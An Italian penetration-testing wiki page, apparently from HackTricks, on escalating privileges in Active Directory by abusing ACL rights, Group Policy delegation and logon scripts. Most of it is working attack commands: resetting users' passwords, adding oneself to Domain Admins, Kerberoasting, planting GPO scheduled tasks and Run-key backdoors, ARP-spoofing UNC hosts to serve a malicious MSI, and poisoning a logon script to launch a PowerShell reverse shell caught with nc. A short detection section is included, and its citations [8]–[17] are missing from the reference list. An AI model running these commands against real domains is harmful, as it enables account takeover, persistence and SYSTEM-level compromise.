# Abusare delle ACL/ACE di Active Directory

{{#include ../../../banners/hacktricks-training.md}}

**Questa pagina è principalmente un riepilogo delle tecniche descritte in** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces) **e in** [**https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)**. Per maggiori dettagli, consulta gli articoli originali.**<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## BadSuccessor


{{#ref}}
BadSuccessor.md
{{#endref}}

## **Diritti GenericAll su un utente**

Questo privilegio concede a un attaccante il controllo completo dell'account utente bersaglio. Dopo aver verificato i diritti `GenericAll` con il comando `Get-ObjectAcl`, un attaccante può:

- **Modificare la password del bersaglio**: usando `net user <username> <password> /domain`, l'attaccante può reimpostare la password dell'utente.
- Da Linux, puoi fare lo stesso tramite SAMR con `net rpc` di Samba:<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Reset target user's password over SAMR from Linux
net rpc password <samAccountName> '<NewPass>' -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

- **Se l'account è disabilitato, rimuovi il flag UAC**: `GenericAll` consente di modificare `userAccountControl`. Da Linux, BloodyAD può rimuovere il flag `ACCOUNTDISABLE`:<sup>[[8]](#references)[[10]](#references)</sup>

```bash
bloodyAD --host <dc_fqdn> -d <domain> -u <user> -p '<pass>' remove uac <samAccountName> -f ACCOUNTDISABLE
```

- **Targeted Kerberoasting**: Assegna uno SPN all'account dell'utente per renderlo vulnerabile al Kerberoasting, quindi usa Rubeus e targetedKerberoast.py per estrarre e tentare di decifrare gli hash del ticket-granting ticket (TGT).

```bash
Set-DomainObject -Credential $creds -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}
.\Rubeus.exe kerberoast /user:<username> /nowrap
Set-DomainObject -Credential $creds -Identity <username> -Clear serviceprincipalname -Verbose
```

- **Targeted ASREPRoasting**: Disabilita la pre-autenticazione per l'utente, rendendo il suo account vulnerabile ad ASREPRoasting.

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- **Shadow Credentials / Key Credential Link**: Con `GenericAll` su un utente puoi aggiungere una credenziale basata su certificato e autenticarti come quell'utente senza cambiarne la password. Vedi:

{{#ref}}
shadow-credentials.md
{{#endref}}

## **Diritti GenericAll su un gruppo**

Questo privilegio consente a un attaccante di modificare l'appartenenza ai gruppi se dispone dei diritti `GenericAll` su un gruppo come `Domain Admins`. Dopo aver identificato il nome distinto del gruppo con `Get-NetGroup`, l'attaccante può:

- **Aggiungersi al gruppo Domain Admins**: è possibile farlo con comandi diretti o usando moduli come Active Directory o PowerSploit.

```bash
net group "domain admins" spotless /add /domain
Add-ADGroupMember -Identity "domain admins" -Members spotless
Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
```

- Da Linux puoi anche usare BloodyAD per aggiungerti a gruppi arbitrari quando hai GenericAll/Write sulla membership di tali gruppi. Se il gruppo target è annidato in “Remote Management Users”, otterrai immediatamente accesso WinRM agli host che riconoscono quel gruppo:<sup>[[8]](#references)</sup>

```bash
# Linux tooling example (BloodyAD) to add yourself to a target group
bloodyAD --host <dc-fqdn> -d <domain> -u <user> -p '<pass>' add groupMember "<Target Group>" <user>

# If the target group is member of "Remote Management Users", WinRM becomes available
netexec winrm <dc-fqdn> -u <user> -p '<pass>'
```

## **GenericAll / GenericWrite / Write su Computer/User**

Possedere questi privilegi su un oggetto computer o un account utente consente di:

- **Kerberos Resource-based Constrained Delegation**: consente di assumere il controllo di un oggetto computer.
- **Shadow Credentials**: usare questa tecnica per impersonare un account computer o utente sfruttando i privilegi per creare shadow credentials.

## **WriteProperty su Group**

Se un utente dispone dei diritti `WriteProperty` su tutti gli oggetti di un gruppo specifico (ad es. `Domain Admins`), può:

- **Aggiungersi al gruppo Domain Admins**: possibile combinando i comandi `net user` e `Add-NetGroupUser`; questo metodo consente l'escalation dei privilegi nel dominio.

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **Self (Self-Membership) su un gruppo**

Questo privilegio consente agli attaccanti di aggiungersi a gruppi specifici, come `Domain Admins`, tramite comandi che modificano direttamente l'appartenenza ai gruppi. La seguente sequenza di comandi consente di aggiungersi autonomamente:

```bash
net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
```

## **WriteProperty (Self-Membership)**

Un privilegio simile consente agli attaccanti di aggiungersi direttamente ai gruppi modificandone le proprietà, se dispongono del diritto `WriteProperty` su tali gruppi. La verifica e l’esecuzione di questo privilegio avvengono con:

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
net group "domain admins" spotless /add /domain
```

## **ForceChangePassword**

Possedere il diritto `ExtendedRight` su un utente per `User-Force-Change-Password` consente di reimpostare la password senza conoscere quella attuale. La verifica di questo diritto e il suo sfruttamento possono essere eseguiti tramite PowerShell o strumenti alternativi da riga di comando, che offrono diversi metodi per reimpostare la password di un utente, incluse sessioni interattive e one-liner per ambienti non interattivi. I comandi spaziano da semplici invocazioni di PowerShell all'uso di `rpcclient` su Linux, dimostrando la versatilità dei vettori di attacco.

```bash
Get-ObjectAcl -SamAccountName delegate -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainUserPassword -Identity delegate -Verbose
Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

```bash
rpcclient -U KnownUsername 10.10.10.192
> setuserinfo2 UsernameChange 23 'ComplexP4ssw0rd!'
```

## **WriteOwner su un gruppo**

Se un attacker scopre di avere i diritti `WriteOwner` su un gruppo, può cambiarne la proprietà e assegnarla a sé stesso. Questo è particolarmente rilevante quando il gruppo in questione è `Domain Admins`, poiché diventare proprietario consente un controllo più ampio sugli attributi e sui membri del gruppo. La procedura consiste nell'individuare l'oggetto corretto tramite `Get-ObjectAcl` e poi usare `Set-DomainObjectOwner` per modificarne il proprietario, specificandolo tramite SID o nome.

```bash
Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=offense,DC=local" -and $_.IdentityReference -eq "OFFENSE\spotless"}
Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "spotless" -Verbose
Set-DomainObjectOwner -Identity Herman -OwnerIdentity nico
```

## **GenericWrite su utente**

Questa autorizzazione consente a un attacker di modificare le proprietà dell'utente. In particolare, con accesso `GenericWrite`, l'attacker può modificare il percorso dello script di logon di un utente per eseguire uno script malevolo al logon dell'utente. Questo si ottiene usando il comando `Set-ADObject` per aggiornare la proprietà `scriptpath` dell'utente target e impostarla sullo script dell'attacker.

```bash
Set-ADObject -SamAccountName delegate -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
```

Un ACE `WriteProperty` più circoscritto, applicato all'attributo [`scriptPath` dell'utente](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-ada3/c640630e-23ff-44e7-886f-16df9574039e), può essere sufficiente; `GenericWrite` non è necessario. Abbina questo diritto sull'attributo a uno script scrivibile nell'albero `SYSVOL\<domain>\scripts` o `NETLOGON` del dominio, quindi valuta se è probabile che l'utente target effettui l'accesso e raggiunga lo script. Lo script viene eseguito nel contesto di quell'utente al momento dell'accesso. Esamina separatamente gli ACL effettivi di AD e quelli di file/condivisioni: un ACE Allow corrispondente o una directory scrivibile, da soli, non dimostrano che il percorso sia completo.

## **GenericWrite su un gruppo**

Con questo privilegio, gli attacker possono manipolare l'appartenenza ai gruppi, ad esempio aggiungendo sé stessi o altri utenti a gruppi specifici. Il processo prevede la creazione di un oggetto credenziale, il suo utilizzo per aggiungere o rimuovere utenti da un gruppo e la verifica delle modifiche all'appartenenza con comandi PowerShell.

```bash
$pwd = ConvertTo-SecureString 'JustAWeirdPwd!$' -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)
Add-DomainGroupMember -Credential $creds -Identity 'Group Name' -Members 'username' -Verbose
Get-DomainGroupMember -Identity "Group Name" | Select MemberName
Remove-DomainGroupMember -Credential $creds -Identity "Group Name" -Members 'username' -Verbose
```

- Da Linux, Samba `net` può aggiungere o rimuovere membri se disponi di `GenericWrite` sul gruppo (utile quando PowerShell/RSAT non sono disponibili):<sup>[[9]](#references)[[10]](#references)</sup>

```bash
# Add yourself to the target group via SAMR
net rpc group addmem "<Group Name>" <user> -U <domain>/<user>%'<pass>' -S <dc_fqdn>
# Verify current members
net rpc group members "<Group Name>" -U <domain>/<user>%'<pass>' -S <dc_fqdn>
```

## **WriteDACL + WriteOwner**

Essere proprietari di un oggetto AD e disporre dei privilegi `WriteDACL` su di esso consente a un attacker di concedersi privilegi `GenericAll` sull'oggetto. Questo si ottiene manipolando ADSI, ottenendo il controllo completo dell'oggetto e la possibilità di modificarne le appartenenze ai gruppi. Tuttavia, esistono limitazioni quando si cerca di sfruttare questi privilegi usando i cmdlet `Set-Acl` / `Get-Acl` del modulo Active Directory.<sup>[[4]](#references)[[7]](#references)</sup>

```bash
$ADSI = [ADSI]"LDAP://CN=test,CN=Users,DC=offense,DC=local"
$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
$ADSI.psbase.commitchanges()
```

### Acquisizione rapida di controllo con WriteDACL/WriteOwner (PowerView)

Quando disponi di `WriteOwner` e `WriteDacl` su un utente o un account di servizio, puoi assumerne il controllo completo e reimpostarne la password usando PowerView senza conoscere quella precedente:

```powershell
# Load PowerView
. .\PowerView.ps1

# Grant yourself full control over the target object (adds GenericAll in the DACL)
Add-DomainObjectAcl -Rights All -TargetIdentity <TargetUserOrDN> -PrincipalIdentity <YouOrYourGroup> -Verbose

# Set a new password for the target principal
$cred = ConvertTo-SecureString 'P@ssw0rd!2025#' -AsPlainText -Force
Set-DomainUserPassword -Identity <TargetUser> -AccountPassword $cred -Verbose
```

Note:
- Potrebbe essere necessario cambiare prima il proprietario impostandoti come proprietario, se hai solo `WriteOwner`:

```powershell
Set-DomainObjectOwner -Identity <TargetUser> -OwnerIdentity <You>
```

- Verifica l'accesso con qualsiasi protocollo (SMB/LDAP/RDP/WinRM) dopo il reset della password.

## **Replicazione nel dominio (DCSync)**

L'attacco DCSync sfrutta specifici permessi di replica sul dominio per simulare un Domain Controller e sincronizzare i dati, incluse le credenziali degli utenti. Questa potente tecnica richiede permessi come `DS-Replication-Get-Changes`, che consentono agli attaccanti di estrarre informazioni sensibili dall'ambiente AD senza accedere direttamente a un Domain Controller.<sup>[[5]](#references)</sup> [**Scopri di più sull'attacco DCSync.**](../dcsync.md)

## Delega GPO <a href="#gpo-delegation" id="gpo-delegation"></a>

### Delega GPO

L'accesso delegato alla gestione dei Group Policy Objects (GPO) può comportare rischi significativi per la sicurezza. Ad esempio, se a un utente come `offense\spotless` vengono delegati i diritti di gestione delle GPO, potrebbe disporre di privilegi come **WriteProperty**, **WriteDacl** e **WriteOwner**. Questi permessi possono essere sfruttati per scopi malevoli, come individuato usando PowerView: `bash Get-ObjectAcl -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`<sup>[[6]](#references)</sup>

### Enumerare i permessi delle GPO

Per identificare le GPO configurate in modo errato, è possibile concatenare i cmdlet di PowerSploit. In questo modo si possono individuare le GPO che un utente specifico ha i permessi di gestire: `powershell Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name} | ? {$_.IdentityReference -eq "OFFENSE\spotless"}`

**Computer a cui è applicata una determinata policy**: è possibile individuare i computer a cui si applica una specifica GPO, per comprendere l'entità del potenziale impatto. `powershell Get-NetOU -GUID "{DDC640FF-634A-4442-BC2E-C05EED132F0C}" | % {Get-NetComputer -ADSpath $_}`

**Policy applicate a un determinato computer**: per vedere quali policy sono applicate a un computer specifico, si possono usare comandi come `Get-DomainGPO`.

**OU a cui è applicata una determinata policy**: è possibile identificare le unità organizzative (OU) interessate da una determinata policy usando `Get-DomainOU`.

È anche possibile usare lo strumento [**GPOHound**](https://github.com/cogiceo/GPOHound) per enumerare le GPO e individuare eventuali problemi.

### Sfruttare le GPO - New-GPOImmediateTask

Le GPO configurate in modo errato possono essere sfruttate per eseguire codice, ad esempio creando un'attività pianificata immediata. Questo può essere usato per aggiungere un utente al gruppo degli amministratori locali sui computer interessati, elevando significativamente i privilegi:

```bash
New-GPOImmediateTask -TaskName evilTask -Command cmd -CommandArguments "/c net localgroup administrators spotless /add" -GPODisplayName "Misconfigured Policy" -Verbose -Force
```

### GroupPolicy module - Abuse GPO

Il modulo GroupPolicy, se installato, consente di creare e collegare nuovi GPO e di impostare preferenze, come i valori del registro, per eseguire backdoor sui computer interessati. Questo metodo richiede che il GPO venga aggiornato e che un utente acceda al computer affinché il codice venga eseguito:

```bash
New-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=domain,DC=io"
Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "%COMSPEC% /b /c start /b /min \\dc-2\software\pivot.exe" -Type ExpandString
```

### SharpGPOAbuse - Abuso delle GPO

SharpGPOAbuse offre un metodo per abusare delle GPO esistenti aggiungendo attività o modificando impostazioni senza dover creare nuove GPO. Questo strumento richiede la modifica di GPO esistenti oppure l'uso degli strumenti RSAT per crearne di nuove prima di applicare le modifiche:

```bash
.\SharpGPOAbuse.exe --AddComputerTask --TaskName "Install Updates" --Author NT AUTHORITY\SYSTEM --Command "cmd.exe" --Arguments "/c \\dc-2\software\pivot.exe" --GPOName "PowerShell Logging"
```

### Forzare l'aggiornamento dei criteri

Gli aggiornamenti GPO avvengono in genere ogni 90 minuti circa. Per accelerare il processo, soprattutto dopo aver implementato una modifica, è possibile eseguire il comando `gpupdate /force` sul computer di destinazione per forzare un aggiornamento immediato dei criteri. Il comando assicura che tutte le modifiche alle GPO vengano applicate senza attendere il successivo ciclo di aggiornamento automatico.

### Dettagli interni

Esaminando le Attività pianificate di una determinata GPO, come `Misconfigured Policy`, è possibile verificare l'aggiunta di attività quali `evilTask`. Queste attività vengono create tramite script o strumenti da riga di comando per modificare il comportamento del sistema o aumentare i privilegi.

La struttura dell'attività, come mostrata nel file di configurazione XML generato da `New-GPOImmediateTask`, specifica i dettagli dell'attività pianificata, incluso il comando da eseguire e i relativi trigger. Questo file mostra come vengono definite e gestite le attività pianificate nelle GPO e offre un metodo per eseguire comandi o script arbitrari durante l'applicazione dei criteri.

### Utenti e gruppi

Le GPO consentono anche di modificare gli utenti e l'appartenenza ai gruppi nei sistemi di destinazione. Modificando direttamente i file dei criteri Users and Groups, gli attaccanti possono aggiungere utenti a gruppi privilegiati, come il gruppo locale `administrators`. Ciò è possibile delegando le autorizzazioni di gestione delle GPO, che consentono di modificare i file dei criteri per includervi nuovi utenti o cambiare l'appartenenza ai gruppi.

Il file di configurazione XML di Users and Groups descrive come implementare queste modifiche. Aggiungendo voci a questo file, è possibile concedere privilegi elevati a utenti specifici su tutti i sistemi interessati. Questo metodo offre un approccio diretto all'escalation dei privilegi tramite la manipolazione delle GPO.

Per le impostazioni di sicurezza, come l'appartenenza ai gruppi locali e i diritti utente, controlla anche il template GPO applicato in `Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf` e l'ACL della directory `SecEdit`. Una directory o un file scrivibile è un indizio da approfondire: l'accesso effettivo alla condivisione SYSVOL, le ACL di negazione e quelle ereditate, le autorizzazioni del contenitore Group Policy, l'ambito dei criteri e l'aggiornamento del client determinano comunque se una modifica può avere effetto. La sola appartenenza a un gruppo denominato “GPO Managers” non conferisce diritti di modifica. [Microsoft documenta questo percorso del template e la distinzione tra contenitore e template di Group Policy.](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-gpsb/a600273b-75fc-4ce7-a1a3-ae221e102e91)

Inoltre, si possono considerare altri metodi per eseguire codice o mantenere la persistenza, come sfruttare gli script di logon/logoff, modificare le chiavi di registro per gli autoruns, installare software tramite file .msi o modificare le configurazioni dei servizi. Queste tecniche offrono diverse modalità per mantenere l'accesso e controllare i sistemi di destinazione abusando delle GPO.

### Reindirizzare il recupero di GPC/GPT verso servizi rogue autenticati

Una GPO è composta da un **Group Policy Container (GPC)** LDAP contenente metadati e da un **Group Policy Template (GPT)** ospitato su SMB e contenente i file dei criteri. Durante l'aggiornamento, il client segue il `gPLink` del contenitore, legge il GPC a cui fa riferimento e il relativo `gPCFileSysPath`, quindi scarica il GPT da quel percorso UNC. Di conseguenza, l'accesso in scrittura al GPC stesso o al `gPLink` di un'OU, un Site o un Domain può essere sfruttato per attivare l'elaborazione di criteri con privilegi elevati.<sup>[[12]](#references)[[13]](#references)[[14]](#references)[[15]](#references)</sup>

#### Avvelenamento di `gPCFileSysPath` con GPOddity

Se il principal controllato può scrivere nel GPC di destinazione (direttamente o tramite **NTLM relay to LDAP**), può sostituire `gPCFileSysPath` con un percorso UNC ospitato dall'attaccante. [GPOddity](https://github.com/synacktiv/GPOddity) automatizza la modifica LDAP e serve un GPT malevolo contenente file di criteri basati su moduli o un Immediate Task, che il client Group Policy esegue come `NT AUTHORITY\SYSTEM`.<sup>[[12]](#references)[[15]](#references)[[16]](#references)</sup>

Una condivisione SMB anonima o che non richiede credenziali non è sufficiente sui client Windows attuali: SMB Secure Negotiate richiede la prova che l'autenticazione sia riuscita, quindi il servizio rogue deve convalidare l'identità di dominio, derivare la chiave di sessione SMB e firmare correttamente le risposte. In modalità embedded, configura GPOddity con un account macchina controllato e la relativa chiave di servizio, quindi seleziona un payload lato computer o lato utente nella sezione `[COMMANDS]`.<sup>[[15]](#references)[[16]](#references)</sup>

```ini
[SMB]
smb-mode=embedded
smb-machine=SCAPY$
smb-ip=<attacker_ip>
smb-nt=<machine_nt_hash>
smb-share=gpoddity
smb-iface=eth0
```

```bash
python3 gpoddity.py --config config.ini -v
```

**Caso limite GPO dell'utente:** dopo MS16-072, Windows crea ancora due sessioni SMB2 nella **stessa connessione TCP**: la sessione utente legge `GPT.INI`, poi la sessione dell'account computer legge la configurazione effettiva, ad esempio `ScheduledTasks.xml`. Un server malevolo deve quindi indicizzare lo stato di autenticazione, le chiavi di sessione e le chiavi di firma per `SessionId` SMB2, non solo per socket. Il fork di Scapy integrato in GPOddity/OUned implementa questa funzionalità tramite `SMBStreamSocketMultiplexing` e un `SMBServer` compatibile con il multiplexing; altrimenti, i server Impacket/Scapy a sessione singola riutilizzano lo stato di firma errato e non riescono a gestire le policy utente.<sup>[[15]](#references)</sup>

#### `gPLink` poisoning con OUned

Con `WriteGPLink`, `GenericWrite` o un controllo equivalente su una OU, un Site o un Domain, un attaccante può aggiungere un link il cui DN GPC è servito da un host LDAP controllato dall'attaccante. Questa primitiva è stata presentata originariamente da Petros Koutroumpis; [OUned](https://github.com/synacktiv/OUned) automatizza la scrittura LDAP e la catena GPC/GPT malevola.<sup>[[13]](#references)[[14]](#references)[[17]](#references)</sup>

```text
[LDAP://cn={7B7D6B23-26F8-4E4B-AF23-F9B9005167F6},cn=policies,cn=system,DC=attacker,DC=corp,DC=com;0]
```

La vittima si autentica prima al servizio LDAP rogue e riceve un GPC il cui `gPCFileSysPath` punta al servizio SMB rogue; poi si autentica a SMB e applica il GPT fornito. OUned ha quindi bisogno di un account con un LDAP SPN, di un account macchina con un HOST SPN per SMB (lo stesso account macchina può soddisfare entrambi i requisiti) e della risoluzione DNS o dell’inoltro inverso che indirizzi le porte 389 e 445 all’host dell’operatore.<sup>[[15]](#references)[[17]](#references)</sup>

```bash
python3 OUned.py --config config.ini -v
```

La parte Scapy LDAP integrata in OUned convalida Kerberos/SPNEGO usando la chiave reale del servizio controllato e fornisce dati GPC arbitrari da JSON. La chiave JSON vuota rappresenta rootDSE, i prefissi `base64:` indicano valori binari e il server supporta le operazioni add/delete/modify/search e le ricerche `BASE`, `LEVEL` e `SUBTREE`; può negoziare nessuna protezione, integrità o riservatezza. Questo rende il servizio riutilizzabile quando un altro componente Windows segue un riferimento LDAP controllato da un attacker, ma richiede LDAP autenticato.<sup>[[15]](#references)</sup>

Non dare per scontato che sincronizzare la password di un account in un dominio dummy riproduca tutte le chiavi Kerberos: RC4 deriva dalla password, mentre AES string-to-key usa anche un salt derivato dall'hostname/dominio del principal. Fornire la chiave AES effettiva dell'account a `KerberosSSP` evita di forzare RC4 tramite una modifica rilevabile a `msDS-SupportedEncryptionTypes`, attributo scrivibile dall'account computer stesso.<sup>[[15]](#references)</sup>

#### Punti di rilevamento

Correla le modifiche a `gPCFileSysPath` o `gPLink` con le modifiche alla versione dei GPO e con nuovi file XML di Immediate/Scheduled Task. Esamina i collegamenti a naming context imprevisti, host UNC esterni all'insieme approvato di DC/SYSVOL, record DNS che reindirizzano i nomi degli account computer, ticket di servizio LDAP/CIFS per account computer insoliti e modifiche a `msDS-SupportedEncryptionTypes` che abilitano RC4.<sup>[[15]](#references)</sup>

### WriteGPLink + dirottamento di percorsi UNC (ARP spoofing)

`WriteGPLink` su un'OU/dominio consente di modificare l'attributo `gPLink` del container di destinazione e **forzare l'applicazione di un GPO esistente** senza modificare il GPO stesso. Questo è interessante quando il GPO collegato fa già riferimento a contenuti remoti tramite **percorsi UNC** (`\\HOST\share\...`), perché gli utenti autenticati possono leggere **SYSVOL** e cercare offline policy riutilizzabili.<sup>[[11]](#references)</sup>

Flusso di lavoro generale:

1. Usa BloodHound per identificare un principal con `WriteGPLink` su un'OU e enumerare i computer/utenti all'interno di quell'OU.
2. Clona `SYSVOL` in sola lettura e analizza i GPO alla ricerca di **Software Installation**, **mappature delle unità** (`Drives.xml`) e **script di logon/avvio** che fanno riferimento a percorsi UNC.
3. Preferisci le policy che puntano a un **hostname diretto** (per esempio `\\DC02\share\pkg.msi`) invece dei percorsi DFS/namespace di dominio, perché è più facile reindirizzare i percorsi basati su hostname con L2 spoofing.
4. Aggiungi il GUID del GPO scelto a `gPLink` dell'OU di destinazione, così la vittima elabora quella policy già esistente.
5. Sullo stesso dominio broadcast, esegui ARP spoofing dell'host UNC e associa localmente il suo IP (`ip addr add <target_ip>/32 dev <iface>`) in modo che il traffico SMB della vittima raggiunga il tuo host.
6. Fornisci il percorso/nome file previsto da un server SMB attacker (per esempio `smbserver.py`) e attendi la normale elaborazione della policy.

Esempio di raccolta di `SYSVOL` e correlazione dei GPO:

```bash
mkdir -p /mnt/$DOMAIN/SYSVOL/
mount -t cifs -o username=$USER,password=$PASS,domain=$DOMAIN,ro "//$DC_IP/SYSVOL" "/mnt/$DOMAIN/SYSVOL/"
rsync -av --exclude="PolicyDefinitions" --update /mnt/$DOMAIN/SYSVOL .
python3 parse_sysvol.py software -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py drives -s <SYSVOL> -b <BloodHound_Folder>
python3 parse_sysvol.py scripts -s <SYSVOL> -b <BloodHound_Folder>
```

Collega il GPO esistente all'OU di destinazione:

```bash
python3 link_gpo.py -u <user> -p '<pass>' -d <domain> -dc-ip <dc_ip> \
  --gpo-guid '{<gpo-guid>}' --target-ou "OU=<TargetOU>,DC=<domain>,DC=<tld>"
```

#### Software Installation UNC hijack -> SYSTEM

Se la GPO collegata distribuisce un MSI da un percorso UNC, il client lo recupera durante l'**avvio del computer** e lo installa come **`NT AUTHORITY\SYSTEM`**. Spoofando l'host indicato e servendo un MSI malevolo con **lo stesso percorso/nome di condivisione**, puoi trasformare `WriteGPLink` in esecuzione di codice come SYSTEM **senza modificare SYSVOL**.

Vincoli importanti:

- **Il tempismo è importante**: il nuovo collegamento viene rilevato al refresh dei criteri (comunemente ogni ~90 minuti), ma **Software Installation** viene in genere attivato al **riavvio**.
- Windows Installer tiene comunemente traccia della distribuzione usando il **`ProductCode`** del pacchetto. Se il prodotto è già installato, la distribuzione potrebbe essere ignorata.
- Per evitare che l'installer rifiuti il pacchetto, modifica l'MSI rogue in modo che i suoi **`ProductCode`** e **`PackageCode`** corrispondano a quelli del pacchetto legittimo previsto dalla GPO.
- I vecchi file di annuncio `.aas` potrebbero rimanere in `SYSVOL`, quindi verifica che la distribuzione risulti ancora attiva prima di farci affidamento.

```bash
ip addr add <unc_host_ip>/32 dev <iface>
arpspoof-ng -i <iface> -t <victim1>,<victim2> -s <unc_host_ip>
smbserver.py <share> ./payloads -smb2support --interface-address <unc_host_ip> -debug -ts
```

#### Hijack UNC delle unità mappate -> NTLM capture / relay WebDAV

Le mappature delle unità GPP in `Drives.xml` fanno sì che gli utenti si autentichino al percorso UNC configurato durante l'accesso o la riconnessione. Se spoofi l'host a cui fa riferimento il percorso, puoi catturare **NetNTLMv2**. Se forzi deliberatamente un errore SMB, Windows potrebbe riprovare tramite **WebDAV**, inviando **NTLM su HTTP**: una modalità molto più flessibile per effettuare relay verso **LDAP(S)**, **AD CS** o **SMB**.

#### Hijack UNC di script di logon/startup

Lo stesso schema si applica agli script ospitati su UNC individuati in `SYSVOL`:

- Gli **script di logon** vengono solitamente eseguiti nel contesto dell'**utente**.
- Gli **script di startup** vengono solitamente eseguiti nel contesto del **computer / SYSTEM**.

Se il percorso dello script punta a un hostname che può essere spoofato, reindirizza l'host UNC e servi contenuto sostitutivo per lo script dalla posizione prevista.

## Avvelenamento degli script di logon SYSVOL/NETLOGON

I percorsi scrivibili in `\\<dc>\SYSVOL\<domain>\scripts\` o `\\<dc>\NETLOGON\` consentono di manomettere gli script di logon eseguiti dagli utenti all'accesso tramite GPO. Ciò consente l'esecuzione di codice nel contesto di sicurezza degli utenti che effettuano l'accesso.

### Individuare gli script di logon
- Esamina gli attributi degli utenti per trovare uno script di logon configurato:

```powershell
Get-DomainUser -Identity <user> -Properties scriptPath, scriptpath
```

- Scansiona le condivisioni di dominio per individuare collegamenti o riferimenti a script:

```bash
# NetExec spider (authenticated)
netexec smb <dc_fqdn> -u <user> -p <pass> -M spider_plus
```

- Analizza i file `.lnk` per individuare i target che puntano a SYSVOL/NETLOGON (utile trucco DFIR per chi non ha accesso diretto alle GPO, inclusi gli attacker):

```bash
# LnkParse3
lnkparse login.vbs.lnk
# Example target revealed:
# C:\Windows\SYSVOL\sysvol\<domain>\scripts\login.vbs
```

- BloodHound mostra l'attributo `scriptPath` dell'oggetto utente, che specifica lo script di logon, se presente. Gli script di logon configurati tramite GPO sono un riferimento a policy separato, quindi controlla anche la GPO applicabile.

### Verifica dell'accesso in scrittura (non fidarti degli elenchi delle share)
Gli strumenti automatizzati possono indicare SYSVOL/NETLOGON come di sola lettura anche quando lo script specifico ha una ACL NTFS diversa. Inizia con un'ispezione di sola lettura del file e della directory padre; gli ACE Allow corrispondenti restano possibili candidati, perché contano l'accesso effettivo SMB e NTFS, gli ACE Deny e il token corrente:

```powershell
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts\login.vbs' |
  Format-List Owner,AccessToString
Get-Acl -LiteralPath '\\dc.example.test\SYSVOL\example.test\scripts' |
  Format-List Owner,AccessToString
```

Un test di scrittura autorizzato dovrebbe essere specifico per il target e reversibile, con lo script originale salvato e ripristinato. Non sovrascrivere uno script di logon funzionante solo per testare l'accesso: una scrittura riuscita potrebbe essere eseguita al successivo logon di un utente.

### Avvelenare uno script di logon VBScript per RCE
Aggiungi un comando che avvii una reverse shell PowerShell (generala da revshells.com) e mantieni la logica originale per non compromettere le funzioni aziendali:

```vb
' At top of login.vbs
Set cmdshell = CreateObject("Wscript.Shell")
cmdshell.run "powershell -e <BASE64_PAYLOAD>"

' Existing mappings remain
MapNetworkShare "\\\\<dc_fqdn>\\apps", "V"
MapNetworkShare "\\\\<dc_fqdn>\\docs", "L"
```

Mettiti in ascolto sul tuo host e attendi il prossimo accesso interattivo:

```bash
rlwrap -cAr nc -lnvp 443
```

Note:
- L’esecuzione avviene con il token dell’utente di logging (non SYSTEM). L’ambito è il collegamento GPO (OU, sito, dominio) che applica lo script.
- Dopo l’uso, ripristinare il contenuto e i timestamp originali.


## References

- [1] [Abuso delle ACL/ACE di Active Directory](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces)
- [2] [Account privilegiati e privilegi dei token](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [3] [BloodHound 1.3 – L’aggiornamento sui percorsi di attacco ACL](https://wald0.com/?p=112)
- [4] [Enum ActiveDirectoryRights - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=netframework-4.7.2)
- [5] [Escalation dei privilegi con le ACL in Active Directory](https://blog.fox-it.com/2018/04/26/escalating-privileges-with-acls-in-active-directory/)
- [6] [Scansione dei privilegi e degli account privilegiati di Active Directory](https://adsecurity.org/?p=3658)
- [7] [Costruttore ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
